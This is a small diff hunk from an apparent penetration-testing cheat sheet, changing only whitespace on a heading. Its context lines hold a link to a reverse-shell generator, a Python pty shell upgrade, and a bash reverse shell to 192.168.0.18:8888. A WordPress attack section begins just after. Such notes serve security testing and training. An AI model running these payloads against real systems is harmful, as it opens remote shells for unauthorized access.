@@ -176,7 +176,7 @@ sitemap.xml
 ``` https://www.revshells.com/ ```  
 ## Python   
 ``` python3 -c 'import pty; pty.spawn("/bin/sh")' ```  
-## Bash
+## Bash  
 ``` bash -c 'bash -i &> /dev/tcp/192.168.0.18/8888 0<&1' ```  
 
 ## Wordpress Manual Attack  
